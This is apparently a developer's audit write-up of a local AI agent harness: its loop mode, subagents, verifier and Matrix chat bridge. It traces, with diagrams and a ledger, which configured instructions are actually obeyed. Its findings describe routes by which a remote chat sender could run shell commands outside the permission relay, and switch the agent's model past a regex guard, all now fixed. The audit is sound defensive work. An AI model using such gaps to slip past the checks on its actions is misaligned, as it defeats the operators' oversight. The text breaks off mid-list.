# Subagents, the loop, and the verifier — the instructions that never arrived

Thirteenth pass, 2026-08-18. A full read of the whole stack — the loop,
subagents, the verifier, and the three extensions under and beside them — asking
the mirror image of the twelfth pass's question.

The twelfth pass followed the **answers outward**: *this thing produces an
answer; name the reader, and say what the reader sees when the delivery fails.*
That question produced §8 of `…-deliveries.md`, the delivery ledger, and five
findings.

This one follows the **instructions inward**:

> **Name the mechanism, and say what happens to the instruction it was given.**

An instruction is anything that is supposed to change what a mechanism does: a
per-agent model override, a `--check` command, a `StopAgent` call, a permission
mode, an allow-list entry, an `/agents` menu setting, an environment variable.
Every one of them is set in one place and honoured — or not — somewhere else, and
the gap between the two is where all seven of this pass's findings live.

```
   AD1  Every layer of the subagent model precedence above "the parent's own
        model" was resolved, injected onto the tool-call arguments, rendered
        next to the call in the TUI, listed as the effective model in
        `/agents` → models — and then dropped by one `undefined` in
        `executeAgentTool`. The twelfth pass removed the read under a correct
        premise about the wrong sender, and the TEST it wrote to pin the
        removal is why nobody looked again.                       HIGH · FIXED

   AD2  T5 made a verifying record stoppable in `AgentManager.stopAgent()`.
        The `StopAgent` TOOL has its own precondition one layer up, keyed on
        `lifecycle.status`, which is terminal for the whole of a verification —
        so the manager was never asked, and the model was told the agent was
        "already completed" while a judge held the single llama slot its own
        next call was queued behind.                            MEDIUM · FIXED

   AD3  AC5 made `/compact` from Matrix real. pi's `AgentSession.compact()`
        begins `await this.abort()`, so the first thing a remote `/compact` did
        was cancel the turn in flight — and, through `pi-loop-mode`'s
        aborted-turn branch, PAUSE an unattended run and record it as
        `Turn aborted by operator`.                               HIGH · FIXED

   AD4  "Ran `X`" was AC5's own objection — a claim made on the strength of
        having CALLED the function — and AC5 fixed only the command pi cannot
        dispatch. pi catches a throwing command handler itself and reports it
        as handled, and AC4's `answered` flag now exempts the entry from the
        sweep that would have corrected it.                     MEDIUM · FIXED

   AD5  `/agents` — an extension command this stack registers — was in neither
        routing table, so a Matrix `/agents` was neither run nor refused but
        spent as a model turn on text the model cannot act on.      LOW · FIXED

   AD6  `MATRIX_ALLOWED.loop` is `null`, and the header justifies that on the
        grounds that a sender "can already direct arbitrary work in prose …
        subject only to the permission gate". `--check` is the one argument on
        that surface the clause is false for: it runs through `pi.exec`, which
        emits no `tool_call`, so the permission relay, `rtk-pi`'s gate and
        `compaction-guard`'s cap all never see it — once per iteration, for the
        life of the run, across `/loop resume`.                 MEDIUM · FIXED

   AD7  `--rescue-model` reaches the same `switchModel` that `--model` is
        refused for, just later. The `--model` guard could not catch it: its
        pattern needs whitespace before the flag, and `--rescue-model` has
        `e-` there.                                             MEDIUM · FIXED
```

Five of the seven are the *previous two passes' own fixes*, one layer out. That
is not a coincidence and §14 is about why.

```
                                    before    after
vendor/pi-loop-mode        tests    198       198
vendor/pi-subagents-lite   tests    277       283     lint 85/85 files
vendor/prinny-channel      tests    317       332     lint clean
.pi/extensions/compaction-guard      41        41
vendor/rtk-pi              tests     20        20
                                   ─────     ─────
                                    853       874
probes                                55        59
```

---

## 0. How this sits next to the other twelve

Read `…-deliveries.md` first if you are new: its §1 is the machine and its §8 is
the delivery ledger. This document is a second pass over the same machine along a
different axis, and it is self-contained — §1 to §8 below are a full account of
the stack, not a diff against the twelfth pass.

```
   1st   …-anatomy.md      B1–B8    what each piece is for, and why
   2nd   …-evaluation.md   F1–F11   two correct functions disagreeing at a seam
   3rd   …-mechanics.md    T1–T9    pi's own agent loop, still the best account
   4th   …-surfaces.md     S1–S10   the declaration and the code
   5th   …-units.md        U1–U9    the rule and the thing it governs
   6th   …-shapes.md       V1–V8    the whole and the part
   7th   …-readers.md      W1–W6    a fix and the sites next to it
   8th   …-turns.md        X1–X5,Y1 the harness as a claim about the host
   9th   …-answers.md      Z1–Z4    the call, the argument, and where it lands
  10th   …-hosts.md        AA1–AA4  which events reach us; what an answer CAN say
  11th   …-signals.md      AB1–AB4  when it can say it, and how long it stays true
  12th   …-deliveries.md   AC1–AC5  who receives it, and what they see when nobody does
  13th   THIS ONE          AD1–AD7  who OBEYS it, and what happens to the instruction
```

---

## 1. The whole machine

Everything in this document is a zoom into this drawing. It is the twelfth
pass's §1 with the control axis added: every arrow that carries an **instruction**
— something whose whole purpose is to change what a mechanism downstream does —
is marked `▸`, and every one of those that reaches a mechanism that cannot see it
is marked `▸✘`. The two entry points, the three nested units of a turn, the five
extensions and the event bus are unchanged and still exact.

```
 ┌──────────────┐   ┌─────────────────────────────┐   ┌────────────────────────┐
 │  llama.cpp   │──▶│ forge — OpenAI-compatible   │──▶│           pi           │
 │  ONE slot    │   │ proxy :8081                 │   │        0.84.2          │
 │  32k window  │   │ forge_reasoning_passthrough │   │  reasoning_content ──▶ │
 │  27B, Q4     │   │   emits reasoning_content   │   │   {type:"thinking"}    │
 └──────────────┘   │   beside content, and a     │   └──────────┬─────────────┘
        ▲           │   truthful finish_reason    │              │
        │           └─────────────────────────────┘              │
        │  EVERY box below queues here, one at a time            │
        └───────────────────────────────────────────────────────┘

 ══════════════════════════════════════════════════════════════════════════════
  A.  THE TWO ENTRY POINTS — and only one of them is a "prompt"
 ══════════════════════════════════════════════════════════════════════════════

  ┌─ AgentSession.prompt(text, opts)                    agent-session.js:792 ──┐
  │   reached by:  a HUMAN typing · a subagent's own runner ·                  │
  │                pi.sendUserMessage()  ← prinny-channel's ONLY route         │
  │                                                                            │
  │   /command? ─▶ _tryExecuteExtensionCommand ─▶ RETURN. no turn.     :800    │
  │       ▲ EXTENSION commands only. pi's BUILT-INS (/compact, /model, /new)   │
  │         are executed by the TUI's own input handler.               [AC5]   │
  │       ▲ …and a handler that THROWS is caught HERE, emitted as an           │
  │         extension error, and reported to prompt() as `return true`.        │
  │         So prompt() RESOLVES on a command that failed.             [AD4]   │
  │   compacting?         ─▶ THROW "Cannot submit a prompt while…"      :808   │
  │       ▲ note the ORDER: an extension command is dispatched ABOVE this,     │
  │         so /loop status works during a compaction and plain text does not  │
  │   streaming?          ─▶ streamingBehavior ?? THROW                 :833   │
  │                          followUp ─▶ _queueFollowUp  → _followUpMessages   │
  │                          steer    ─▶ _queueSteer     → _steeringMessages   │
  │                          ▲ THE ONLY TWO ARRAYS hasPendingMessages() SEES   │
  │                            — and they are SHADOWS, drained by matching     │
  │                            the message TEXT on message_start{role:user}    │
  │   idle:                                                             [AA3]  │
  │       no model / no auth   ─▶ THROW                              :848/:855 │
  │       _checkCompaction(lastAssistant, false)                        :865   │
  │       messages = [ user(text), ..._pendingNextTurnMessages ]        :880   │
  │       ┏━ emitBeforeAgentStart(text, images, base, opts) ━━━━━━┓     :885   │
  │       ┃   result.messages   → appended as role:"custom"       ┃     :889   │
  │       ┃   result.systemPrompt !== undefined                   ┃            │
  │       ┃       _systemPromptOverride    = it                   ┃     :902   │
  │       ┃       agent.state.systemPrompt = it   ← nothing unsets┃     :903   │
  │       ┗━ THE ONLY EMIT SITE IN THE WHOLE OF pi ━━━━━━━━━━━━━━━┛            │
  │       _runAgentPrompt(messages)                                            │
  └────────────────────────────────────────────────────────────────────────────┘

  ┌─ AgentSession.sendCustomMessage(msg, options)             :1068 ──────────┐
  │   reached by:  pi.sendMessage() — the ONLY route an extension has         │
  │                pi-loop-mode (every loop turn) · pi-subagents-lite (a      │
  │                background result)                                         │
  │                                                                           │
  │   deliverAs "nextTurn"  ─▶ _pendingNextTurnMessages   drained ONLY  :1079 │
  │                             by prompt() above                    ← Z4     │
  │   isStreaming && triggerTurn !== false                             :1081  │
  │       "followUp" ─▶ agent.followUp(msg)   Agent's OWN queue         :1083 │
  │       else       ─▶ agent.steer(msg)      Agent's OWN queue         :1086 │
  │                     ▲ NEITHER is an array hasPendingMessages() sees [AA3] │
  │   triggerTurn (idle)   ─▶ await _runAgentPrompt(msg)                :1090 │
  │                             ▲ NO emitBeforeAgentStart            [AA1]    │
  │                             ▲ NO _checkCompaction                         │
  │                             ▲ deliverAs DISCARDED                [AA4]    │
  │   RETURNS void. Every failure is pi's `.catch` → emitError → a listener   │
  │   set that is EMPTY outside a TUI.                        [AB2] [AC1]     │
  └───────────────────────────────────────────────────────────────────────────┘

 ══════════════════════════════════════════════════════════════════════════════
  B.  WHAT A "TURN" IS — three nested units, and the loop names the middle one
 ══════════════════════════════════════════════════════════════════════════════

  _runAgentPrompt(messages)                                           :744
    _isAgentRunActive = true      ── isStreaming === !isIdle
    │
    ├── agent RUN #1   runAgentLoop              pi-agent-core/agent-loop.js:43
    │     agent_start · turn_start
    │     for (prompt of prompts) message_start / message_end   :52  ← markLive
    │     ┌── INNER while (hasMoreToolCalls || pendingMessages.length)
    │     │     drain steering → message_start / message_end        :98
    │     │     streamAssistantResponse → message_update… message_end   :253
    │     │       ┗━ message_end is THREADED and the result is written  [X5]
    │     │          OVER the object agent-core holds (_replaceMessageInPlace)
    │     │     executeToolCalls
    │     │       ┏━ prepareToolCall ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ :393
    │     │       ┃  validatedArgs = validateToolArguments(tool, call)┃
    │     │       ┃  beforeToolCall({ args: validatedArgs })          ┃ :405
    │     │       ┃    emitToolCall(event)  — ONE emit site in all pi ┃
    │     │       ┃    `event.input` IS validatedArgs, BY REFERENCE   ┃
    │     │       ┃    handlers MUTATE it; only `block` is read back  ┃
    │     │       ┃    NO try/catch: a throwing handler BLOCKS        ┃
    │     │       ┃  …then tool.execute(id, prepared.args, …)         ┃ :452
    │     │       ┃         ▲ THE SAME OBJECT. This is the channel    ┃
    │     │       ┃           rtk rewrites a command on, and the one  ┃
    │     │       ┃           the Agent tool's model override rides   ┃
    │     │       ┃           — and stopped being read.       ▸✘ AD1  ┃
    │     │       ┗━ prinny's permission relay, then rtk's rewrite ━━━┛
    │     │       execute → afterToolCall → emitToolResult              :551
    │     │         ┗━ ONE shared event object for every handler; each
    │     │            returned field merged into it in order
    │     │            loop fingerprints RAW · guard caps after it
    │     │     turn_end
    │     │     ┏━ prepareNextTurn ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  :286
    │     │     ┃ systemPrompt: _systemPromptOverride ?? _base       ┃
    │     │     ┃ turn 1 did NOT come through here                   ┃  [AA1]
    │     │     ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    │     └── pendingMessages = getSteeringMessages()
    │     OUTER while: getFollowUpMessages() → back into the inner loop
    │     agent_end { messages: newMessages }   ← THE LOOP'S "ITERATION"
    │
    ├── _handlePostAgentRun()                                          :756
    │     _prepareRetry? _checkCompaction(msg)? agent.hasQueuedMessages()?
    │       any true ─▶ agent.continue()                       agent.js:234
    │
    └── finally
          _systemPromptOverride = undefined  ← and NOTHING restores    :753
          agent.state.systemPrompt                             [AA1]
          _flushPendingBashMessages()
          _emitAgentSettled()
            _isAgentRunActive = false   ← BEFORE the handlers run       :328
            emit agent_settled          ← so ctx.isIdle() is TRUE here

  MESSAGE  one assistant reply.
  TURN     one message plus its tool results (pi's `turn_end`).
  RUN      agent_start … agent_end.  `pi-loop-mode` counts this as one iteration.
  PROMPT   one prompt()/sendCustomMessage — possibly several RUNs.

 ══════════════════════════════════════════════════════════════════════════════
  C.  THE FIVE EXTENSIONS, in load order, and what each one OBEYS
 ══════════════════════════════════════════════════════════════════════════════

  scripts/pi-local.sh loads them in THIS order, and the order is load-bearing in
  three separate places:

   1. .pi/extensions/stack.ts          /stack · guards itself in a child   (U7)
   2. .pi/extensions/browser-guard.ts  rewrites a browser timeout
   3. vendor/pi-loop-mode              13 handlers · /loop · the loop tool
   4. .pi/extensions/compaction-guard   3 handlers · no tools · no commands
   5. vendor/pi-subagents-lite          4 handlers · Agent/StopAgent/AgentStatus
   6. vendor/prinny-channel             7 handlers · /prinny · the prinny tool
   7. vendor/rtk-pi                     1 handler  · no tools · no commands

  ┌───────────────┬───────────────┬───────────────┬───────────────┬───────────────┐
  │ pi-loop-mode  │ compaction-   │ pi-subagents- │ prinny-       │ rtk-pi        │
  │               │ guard         │ lite          │ channel       │               │
  ├───────────────┼───────────────┼───────────────┼───────────────┼───────────────┤
  │ 13 handlers   │ 3 handlers    │ 4 handlers    │ 7 handlers    │ 1 handler     │
  │ 3 per-turn    │ summary cap   │ slot table    │ Matrix ⇄ pi   │ bash rewrite  │
  │   buffers     │ tool-out cap  │ watchdog      │ via a         │ allow-list    │
  │ stuck ladder  │ ctx notice    │ verifier      │ sidecar       │ of 23         │
  │ context       │               │ widget        │ typing        │ commands      │
  │   ladder      │ mutates its   │ /agents       │ forwarding    │               │
  │ goal check    │ event IN      │               │ permission    │ mutates       │
  │               │ PLACE         │ deliverAs     │   relay       │ event.input   │
  │ sendMessage   │               │ sendMessage   │               │ IN PLACE      │
  │ → entry 2     │ no host calls │ → entry 2     │ sendUser-     │               │
  │               │ but ctx.*     │               │ Message       │ pi.exec ×2    │
  │ AA1 AA2 AA3   │               │ AA4 Y1 Z1 Z2  │ → entry 1     │               │
  │ X1–X5 Z3 Z4   │ §5, spill     │ AB4 AC1       │               │ §8, AB3       │
  │ AB1 AC2 AC3   │ bound         │ ← AD1 AD2     │ W1 AB2        │               │
  │ ← AD6         │               │               │ AC4 AC5       │               │
  │               │               │               │ ← AD3 AD4     │               │
  │               │               │               │   AD5 AD7     │               │
  ├───────────────┼───────────────┼───────────────┼───────────────┼───────────────┤
  │ inert in a    │ INHERITED by  │ inert in a    │ DENIED to a   │ INHERITED by  │
  │ child, three  │ a child, and  │ child by its  │ child, by a   │ a child via   │
  │ ways over     │ wanted there  │ factory guard │ path regex    │ route B       │
  └───────────────┴───────────────┴───────────────┴───────────────┴───────────────┘

 ══════════════════════════════════════════════════════════════════════════════
  D.  THE EVENT BUS — who handles what, and what each ordering decides
 ══════════════════════════════════════════════════════════════════════════════

   event                    loop   guard  subag  prinny  rtk   threaded?
   ─────────────────────────────────────────────────────────────────────────────
   session_start             ✓             ✓      ✓            ignored
   session_shutdown          ✓             ✓      ✓            ignored
   session_before_compact    ✓      ✓                          LAST TRUTHY WINS
   session_compact           ✓                                 ignored
   agent_start                                    ✓            ignored
   before_agent_start        ✓                                 threaded  [AA1]
   before_provider_request   ✓                                 threaded
   context                   ✓      ✓                          structuredClone,
                                                                 then threaded
   turn_start                              ✓                   ignored
   message_start             ✓                                 ignored
   message_update            ✓                                 ignored
   message_end               ✓                    ✓            THREADED + written
                                                                 back IN PLACE
   tool_call                               ✓      ✓       ✓    block-only; the
                                                                 EVENT IS MUTATED
   tool_result               ✓      ✓                          ONE shared object,
                                                                 fields merged
   agent_end                 ✓                    ✓            ignored
   agent_settled             ✓                    ✓            ignored
   ─────────────────────────────────────────────────────────────────────────────

   CORRECTED in the sixteenth pass (AG4). Between the eleventh and the fifteenth
   this table drew `pi-subagents-lite` handling `agent_start`, `message_end` and
   `agent_end` — it registers none of the three — omitted `tool_call`, which it
   does (`src/events.ts:227`, `toolCallListener`, the row AD6 is about), and had
   no `turn_start` row at all. It registers exactly four handlers, all in
   `src/events.ts`, which is what the "4 handlers" line in the table above it
   always said. `context/testing/probes/t5-the-event-bus-the-map-draws.mjs`
   re-derives this table from the source and diffs it against any document given
   as an argument, so it cannot drift again.

   THREE orderings decide behaviour:

   context        loop FIRST, appends `loop-context-budget`; the guard sees the
                  `-context-budget` suffix and stands down. Both sides check, so
                  either order works. Documented in pi-local.sh.       ✔
   tool_result    loop FIRST, fingerprints the RAW output into the stuck
                  window; the guard's cap runs after. `stripShorteningMarkers`
                  makes rule 7 order-independent.                      ✔
   tool_call      prinny FIRST, rtk SECOND — and this one is NOT symmetric,
                  because a `{block:true}` returns from `emitToolCall`
                  IMMEDIATELY. With prinny first, the command a human approves
                  is the command the model wrote.                      ✔

   NOTE for AD6: this row is the ONLY place a shell command can be reviewed.
   `pi.exec` — which `pi-loop-mode`'s goal check and `rtk-pi`'s version probe
   both use — is `execCommand` directly and emits nothing here at all.

 ══════════════════════════════════════════════════════════════════════════════
  E.  A DELEGATION, WITH EVERY INSTRUCTION MARKED
 ══════════════════════════════════════════════════════════════════════════════

   ┌──────────────────────────────────────────────────────────────────────────┐
   │  the OPERATOR's pi session                                               │
   │   module-global state, shared by every session in this PROCESS:          │
   │     pi-loop-mode   state:LoopState · runToken · pendingTimer · 3 buffers │
   │     pi-subagents   shell{pi,sessionCtx,manager,widget,store,coordinator} │
   │     prinny         child · awaitingReply · typingRooms · deliveryTimer   │
   │                    · pendingCompaction                          ← AD3    │
   │     rtk-pi         (none — the gate is pure)                             │
   │     compaction-gd  spillDir (a mkdtemp, first use, bounded at 50)        │
   │     shell.ts       __PI_SUBAGENT_SPAWN_DEPTH__ on globalThis             │
   └──────────────┬───────────────────────────────────────────────────────────┘
                  │ Agent(prompt, agent:"Explore", run_in_background?)
                  │
   ┏━━━━━━━━━━━━━━▼━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
   ┃  tool_call — where the INSTRUCTIONS are attached                        ┃
   ┃    prinny  needsApproval(toolName, input, settings) → block?            ┃
   ┃    rtk     bash only; rewrites event.input.command in place             ┃
   ┃    subag   toolCallListener:                                           ┃
   ┃              input.model    = store.modelFor(type, parent, cfg)   ▸     ┃
   ┃              input._modelOverride = <shown in the TUI>            ▸     ┃
   ┃              input.thinking = cfg.thinkingLevel ?? default        ▸     ┃
   ┗━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                  │ the SAME object reaches execute()
   ┌──────────────▼────────┐    ┌─────────────────────────────────────────────┐
   │ executeAgentTool      │    │ AgentManager                                │
   │  worktree · type      │───▶│  SlotTable(1) · queue · Watchdog 45min      │
   │  maxTurns  ▸          │    │  parent signal: `.aborted` checked ✔ :328   │
   │  thinking  ▸          │    │  stopAgent(running) = abortCtrl.abort()     │
   │  model     ▸✘ AD1     │    │  stopAgent(verifying) = verifyAbort.abort() │
   │  graceTurns ▸         │    │        ▲ unreachable from StopAgent ✘ AD2   │
   └───────────────────────┘    └────────────────┬────────────────────────────┘
                                                 │ runAgent()
   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
   ┃  THE BUILD WINDOW — seconds, and until AB4 nothing was listening         ┃
   ┃    enterSubagentSpawn()   depth > 0                                      ┃
   ┃    reloadAndMap()         EVERY extension factory runs again —           ┃
   ┃                           and rtk's shells out to `rtk --version` [AB3]  ┃
   ┃    createAgentSession()   → onSessionCreated  (the capture, W6)          ┃
   ┃    bindExtensions()       child session_start                            ┃
   ┃    resolveVisibleTools → setActiveToolsByName → rebuilds the child's     ┃
   ┃                           system prompt from the loader's override       ┃
   ┃    exitSubagentSpawn()                                                   ┃
   ┃    runTurnLoop: if (signal.aborted) throw ABORTED_BEFORE_START    [AB4]  ┃
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                                                 ▼
   ┌──────────────────────────────────────────────────────────────────────────┐
   │  the CHILD's AgentSession — in-process, in-memory SessionManager         │
   │    own system prompt · own tools · own window · own event bus            │
   │    model := options.model ?? findModelInRegistry(agentConfig?.model,…)   │
   │             ▲ the ?? is why AD1 also killed the FRONTMATTER override:    │
   │               the tool always supplied the left side                     │
   │    forwardAbortSignal(session, signal)  ← listener; `.aborted` above     │
   │    ceiling maxTurns → wrap-up steer → hard abort graceTurns later        │
   │    runTurnLoop reads the RUN's answer, per message                ← Z1   │
   │    onCompaction steers the anchor only into a live run            ← Z2   │
   └──────────────────────────┬───────────────────────────────────────────────┘
                              │ settles — status TERMINAL, SLOT STILL HELD
                              ▼
   ┌──────────────────────────────────────────────────────────────────────────┐
   │  the VERIFIER, inside the settlement chain's .then                       │
   │    SUBAGENT_VERIFY / _ROUNDS / _TIMEOUT_MS all read HERE, together  ▸    │
   │    structural gate (free) → judge (fresh __verifier session, 1 turn)     │
   │    → repair (the child's own session, 1 turn) → judge again → …          │
   │    rewrites record.result IN PLACE, so every reader sees one answer      │
   │    startDeadline composes verifyAbort with the timer            T5 AB4   │
   │    ▲ status is ALREADY terminal here. `verifyPhase` is the only field    │
   │      that says work is in flight, and AD2 is the fourth reader of it     │
   └──────────────────────────┬───────────────────────────────────────────────┘
                              │ .finally: release slot, tally, drain, open gate
              ┌───────────────┴────────────────┐
              ▼                                ▼
   ┌────────────────────────┐    ┌──────────────────────────────────────────┐
   │ FOREGROUND             │    │ BACKGROUND / CONTINUATION                │
   │  the completion gate   │    │  tallyCompletion → onComplete            │
   │  resolves the awaited  │    │   → coordinator.onAgentComplete          │
   │  promise               │    │   → scheduleNudge (200 ms batch)         │
   │        │               │    │   → emitIndividualNudge                  │
   │        ▼               │    │        capBackgroundResult(ctx …)   AC1  │
   │  formatResultContent   │    │        pi.sendMessage({subagent-result}, │
   │        │               │    │                       followUp, trigger) │
   │        ▼ ▶             │    │             │ ▶?                         │
   │  the Agent TOOL RESULT │    │             ▼                            │
   │  → compaction-guard's  │    │  entry point 2 — and a `void` return, so │
   │    tool_result cap     │    │  a failure here is a `catch` nobody reads │
   │  → THE PARENT MODEL    │    │  → THE PARENT MODEL                      │
   └────────────────────────┘    └──────────────────────────────────────────┘

 ══════════════════════════════════════════════════════════════════════════════
  F.  A MATRIX EXCHANGE — the only path with a second human on it
 ══════════════════════════════════════════════════════════════════════════════

    Matrix room                    sidecar (child proc, MCP over stdio)
        │  message                        │
        └────────────────────────────────▶│ notifications/claude/channel
                                          ▼
   ┌────────────────────────────────────────────────────────────────────────┐
   │ prinny-channel · deliverInbound                                        │
   │   awaitingReply.set(room, {at, live:false, answered:false, injected})  │
   │   armDeliverySweep()                                             AB2   │
   │   classifyMatrixCommand(body)  — a leading "/" is decided HERE         │
   │        ├─ refuse ─▶ reply(reason)              answered = true   AC4   │
   │        │            KNOWN_COMMANDS ∖ (ALLOWED ∪ LOCAL)                 │
   │        │            /agents was in NONE of the three         ✘ AD5     │
   │        │            --model · --rescue-model · --check       ✘ AD6 AD7 │
   │        ├─ local  ─▶ THIS extension performs it  answered = true   AC5  │
   │        │            /compact → planCompaction(hasSession, agentRunning)│
   │        │              busy → DEFER to agent_settled           ← AD3    │
   │        │              idle → uiCtx.compact({onComplete,onError})       │
   │        ├─ run    ─▶ sendUserMessage(text, {expandPromptTemplates:true})│
   │        │            pi dispatches an EXTENSION command and RETURNS —   │
   │        │            no turn, no user message, so no markLive           │
   │        │            the receipt says HANDED, not RAN         ← AD4     │
   │        └─ text   ─▶ sendUserMessage(text, {deliverAs})           ▶?    │
   │                       └─▶ AgentSession.prompt(…)                       │
   │                             busy → _queueFollowUp (same run)           │
   │                             idle → a whole run                         │
   │                             THROWS → pi `.catch`es → NO LISTENERS AB2  │
   └────────────────────────────────────────────────────────────────────────┘
        │
        │ pi echoes the user message back
        ▼
   message_end{role:"user"} ─▶ markLive(text) ── matched on the Matrix event
        │                       id. THE ROOM IS NOW ANSWERABLE, and not one
        │                       moment sooner
        ▼
   agent_start ─▶ agentRunning = true ─▶ typing indicator, refreshed every 8s
        │          because Matrix expires it at 20 and a 27B thinks longer
        ▼
   message_end{assistant} ─▶ forward:"all" → each message as it finishes   ▶
   agent_end               ─▶ lastAssistantText · describeEmptyEnding      W1
   agent_settled           ─▶ stopTyping · forwardResult                   ▶
                                 forward:"result" → the closing text
                                 empty ending → a bounded continuation
                                 retire live rooms · alreadySent.clear()
                                 sweepUndelivered()                  AB2 AC4
                                 drainPendingCompaction()            ← AD3
```

The single constraint shaping all of it is the slot at the top. One llama slot
means nothing is concurrent with anything else: a child's turn, the judge's turn,
a repair, a Matrix answer and the parent's next call are five things in one
queue. Every finding in this pass costs a place in that queue, or an instruction
that was never carried out, or a mechanism doing something nobody asked it to.

---

## 2. The control ledger

This is the pass's mechanical contribution and the thing that found AD1, AD2 and
AD6. For every **instruction** in this stack — anything whose whole purpose is to
change what some mechanism does — where it is set, where it is resolved, which
mechanism is supposed to obey it, and **whether that mechanism can see it at
all**.

Legend: ✔ obeyed · ⚠ obeyed, with a documented exception · ✘ resolved and
discarded, or unreachable.

```
 instruction              set by            resolved by         obeyed by     ?
 ══════════════════════════════════════════════════════════════════════════════
 SUBAGENTS
 ──────────────────────────────────────────────────────────────────────────────
 agent TYPE               the model         resolveType +       runAgent      ✔
                                            discovery retry
   `hidden: true` gates the MODEL-FACING surface only, so the judge can still
   reach `__verifier` through getAgentConfig and the wizard through the
   coordinator. Two intents, one gate, at the right layer.

 the child's MODEL        /agents → models  store.modelFor()    runAgent   ✘ AD1
   · session per-type     (6 layers)        via toolCallListener            → ✔
   · session default                        writing input.model
   · config per-type                                ▲
   · config default                          rendered by renderAgentToolCall
   · agent .md frontmatter                    listed by menu-model-settings
   · the parent's model                       …and read by nobody until AD1

 the child's THINKING     agent .md,        toolCallListener    runAgent      ✔
                          store default     writing input.thinking
   The control for AD1: the same handler, the same object, one line apart.

 maxTurns                 agent .md,        executeAgentTool    turn-tracking ✔
                          store default
 graceTurns               /agents           executeAgentTool,   turn-tracking,
                                            manager             repair, cont. ✔
   Fixed in an earlier pass: the repair used to hardcode the default, so an
   operator who set 0 got 0 for the run and 6 inside the verifier.

 worktree_path            the model         resolveWorktree +   runAgent cwd  ✔
                                            project trust
 concurrency limits       /agents           SlotTable           spawn, drain,
                                            (+ recount)         continue      ✔
 SUBAGENT_VERIFY          env               runVerification     verifyAnswer  ✔
 SUBAGENT_VERIFY_ROUNDS   env               runVerification     the round loop ✔
 SUBAGENT_VERIFY_TIMEOUT  env               runVerification     startDeadline ✔
   All three read at the same moment, when the child SETTLES. Two of them used
   to be read then and one when the child STARTED.

 STOP — operator Esc      the human         parent AbortSignal  stopAgent     ✔
 STOP — /agents menu      the human         manager.abort()     stopAgent     ✔
 STOP — StopAgent tool    the model         executeStopAgentTool          ✘ AD2
                                            ▲ its own status precondition   → ✔
                                              returned before the manager
                                              was asked
 STOP — watchdog          timeouts          checkWatchdogs      stopAgent     ⚠
   Skips a verifying record by decision: the per-call deadline is minutes
   where the watchdog is 45 of them.
 CLEAR — /agents          the human         manager.clear()     removeRecord  ⚠
   Refuses a verifying record, by decision (Y1). That is the ONE place the
   refusal is right, and AD2 is what happens when the same shape is applied
   to a stop.

 ──────────────────────────────────────────────────────────────────────────────
 THE LOOP
 ──────────────────────────────────────────────────────────────────────────────
 the goal + criteria      /loop start,      applyGoalConfig     loopInstructions ✔
                          the loop tool
 --max                    the same          applyGoalConfig     the cap rung  ✔
 --until-done             the same          applyGoalConfig     the two
                                                                completion rungs ✔
 --check CMD              /loop start,      parseStartArgs /    runGoalCheck  ✔
                          the loop TOOL,    startArgsFromTool-  → pi.exec        (locally)
                          and MATRIX        Params              ▸✘ AD6 (Matrix)
   The value is run as `bash -lc` once per iteration for the life of the run,
   and survives `/loop resume`. `pi.exec` emits no `tool_call`, so it passes
   NONE of this stack's three gates. Refused from Matrix now.

 --model                  /loop, MATRIX     parseStartArgs      switchModel   ✔
                                                                (refused from Matrix)
 --rescue-model           /loop, MATRIX     parseStartArgs      interveneStuck
                                                                → switchModel ✘ AD7
                                                                              → ✔
 --file                   /loop             applyGoalConfig     kindDirective ✔
   Preserved across a re-issue only while `preparedAt` is (V8).
 --delay                  /loop             applyGoalConfig     scheduleLoopTurn ✔
 soft stop (/loop finish) the human         softStopRequested   agent_end rung ✔
 the run token            every start/stop  runToken            every async
                                                                continuation  ✔

 ──────────────────────────────────────────────────────────────────────────────
 prinny-channel
 ──────────────────────────────────────────────────────────────────────────────
 deliverAs                /prinny settings  settings.deliverAs  sendUserMessage ✔
 forward mode             /prinny settings  settings.forward    message_end /
                                                                agent_settled ✔
 permissionMode           /prinny settings  needsApproval()     the tool_call
 permissionTools                                                handler       ⚠
   Correct for every TOOL call. It cannot see `pi.exec`, which is AD6, and
   the default is `off`, so the relay only means anything to an operator who
   turned it on — which is exactly the operator AD6 was misleading.

 the ALLOW-LIST           command-routing   classifyMatrix-     deliverInbound
                          .ts               Command                           ✘ AD5
   KNOWN_COMMANDS is what separates a command from prose. `/agents` was in     → ✔
   neither it nor either table, so it was neither allowed nor refused.

 /compact from Matrix     the sender        classify → local    planCompaction ✘ AD3
                                                                → ctx.compact  → ✔
   The instruction was obeyed. What it DID was abort the turn in flight.

 a command RECEIPT        this file         —                   the sender    ✘ AD4
   "Ran `X`" on the strength of the call. Now "Handed `X` to the session".    → ✔

 ──────────────────────────────────────────────────────────────────────────────
 rtk-pi / compaction-guard
 ──────────────────────────────────────────────────────────────────────────────
 RTK_DISABLED=1           env               the tool_call       pass-through  ✔
                                            handler
   Checked before `shouldFilter`, so one launch can turn it off without an
   edit.
 the rtk ALLOW-LIST       gate.ts           shouldFilter()      rewriteCommand ✔
   23 commands, every entry a measurement (AB3).
 the summary cap          constants         summaryCapChars()   session_before_
                                                                compact       ⚠
   LAST TRUTHY WINS on that event, so when pi-loop-mode returns a
   `{compaction}` the guard's `previousSummary` edit is never read. The
   notice says what was DONE rather than what pi will do with it.
 the tool-output cap      constants         allowanceChars()    tool_result   ✔
 the context notice       constants         contextNotice-      the `context`
                                            Message()          event          ✔
 ══════════════════════════════════════════════════════════════════════════════
```

**Twenty-eight instructions. Five of them were not obeyed, and one more was
obeyed in a way nobody had asked about.** The pattern is not "somebody forgot":
every one of the five was resolved correctly, by careful code, and then lost at
a boundary — a `?? undefined`, a precondition, a table, a receipt, a gate that
watches the wrong channel.

### 2.1 The six surfaces, plus the seventh this pass adds

The series has been accumulating a checklist. It reads, now:

```
   1. what we RETURN from a handler          X5
   2. what we PASS to a call                 Z1–Z4, AA4
   3. which events REACH us at all           AA1
